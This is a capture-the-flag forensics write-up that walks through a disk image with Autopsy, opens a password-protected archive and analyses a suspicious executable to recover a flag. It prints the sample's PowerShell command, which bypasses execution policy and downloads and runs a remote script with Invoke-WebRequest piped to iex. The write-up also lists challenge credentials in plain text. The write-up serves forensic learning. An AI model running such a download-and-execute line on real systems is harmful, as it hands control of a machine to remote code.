# uwu
## Challenge Overview
In this challenge, we are provided with an E01 disk image file. The challenge mentions that a user who loves Naruto is involved, hinting at possible clues related to the user "Naruto." This writeup covers the steps I took using Autopsy and Process Monitor to analyze the disk image and ultimately retrieve the flag.

## Setup Data Source in Autopsy
- Add Data Source: Start by adding the E01 file as a data source in Autopsy.
- Select Disk Image: Choose "disk image and VM file" as the source type.
- Select the File: Choose the provided E01 file.
- Ingest Modules: Enable all options for thorough analysis (recommended for CTF purposes).
## Disk Analysis
The challenge hinted at a user named "Naruto," so I explored the Users/Naruto directory. The key folders were:

- Desktop
- Documents
- Downloads

In the Downloads folder, I found several Base64 encoded ```MP4 files```, a ```private.rar``` file, an executable, and an image file. Decoding the Base64 files led to dead ends, but I continued by extracting the contents of private.rar.
![image](https://github.com/user-attachments/assets/073d832a-2143-47ef-bda5-b6cab180815c)

## Analyzing private.rar
Extracting ```private.rar``` requires a password, which is found in the ```credentials.txt``` file (dattebayo). However, after extracting the file, it only contains more base64-encoded Naruto videos—a dead end.
```
# credentials.txt
naruto:dattebayo
hinata:iloveyou
itachi:shisui
jiraiya:tsunade
```
## Analyzing kotoamatsukami.exe
This executable file appeared to be the key to the challenge, but analyzing it required malware analysis skills. The challenge creator suggested using Process Monitor (ProcMon), a Windows tool, to monitor the program’s behavior.

Since running the file on a host machine is risky, it was instead uploaded to <a href="https://www.hybrid-analysis.com/">Hybrid Analysis</a>, a free automated malware analysis service. The analysis revealed a crucial PowerShell command:
The analysis revealed a crucial PowerShell command:

```powershell
powershell -exec bypass -c 'Invoke-WebRequest https://gist.githubusercontent.com/zachwong02/9f9054bc9db15aeb453dc37e59878aac/raw/48f39f9328189ae8260c6e040eb6d3b57403135e/gistfile1.txt | iex'
```
![image](https://github.com/user-attachments/assets/53d9369a-3bc1-4e7d-9fa3-e35c416c227d)

This command downloads and executes a script from a GitHub Gist. Analyzing the script, I found that it reads metadata from an image file, ```genjustsu.jpg```, extracted earlier from the disk image.

## Retrieving the Flag
To get the flag:

- Create a PS1 Script: Copy the downloaded script into a .ps1 file.
- Place the Image: Ensure genjustsu.jpg is in the same directory as the script.
- Run the Script: Executing the script revealed the flag.
```powershell
$chars = Get-FileMetaData $env:USERPROFILE\\Documents\uwu\Export\260-genjutsu.jpg | Select-Object -ExpandProperty "Title"
$chars[0] + $chars[1] + $chars[14] + $chars[7] + $chars[54] + $chars[55] + $chars[65] + $chars[41] + $chars[4] + $chars[17] + $chars[57] + $chars[62] +$chars[18] + $chars[45] + $chars[55] + $chars[13] + $chars[2] + $chars[4] +  $chars[63] +  $chars[62] + $chars[57] + $chars[63] + $chars[38] +  $chars[50] + $chars[63] + $chars[39] +  $chars[34] + $chars[39] + $chars[35] + $chars[64] + $chars[63] + $chars[48] + $chars[26] + $chars[24] + $chars[66]
```
> The Get-FileMetaData module is not a default PowerShell module in Windows. If you attempt to run a script using this module without first installing it, you'll encounter an error. To resolve this, you can download the module from the link provided and import it into your PowerShell session. Once imported, the script should work as expected. You can download the module <a href="https://gist.github.com/woehrl01/5f50cb311f3ec711f6c776b2cb09c34e">here.</a>
```powershell
PS C:\Users\Documents\uwu\Export> Import-Module -Name "C:\Users\Documents\uwu\Export\Get-FileMetaData"
PS C:\Users\Documents\uwu\Export> ./script
ABOH23{pER5!St3NCE_!5_my_ninj@_waY} 
```
## Flag
```
ABOH23{pER5!St3NCE_!5_my_ninj@_waY}
```
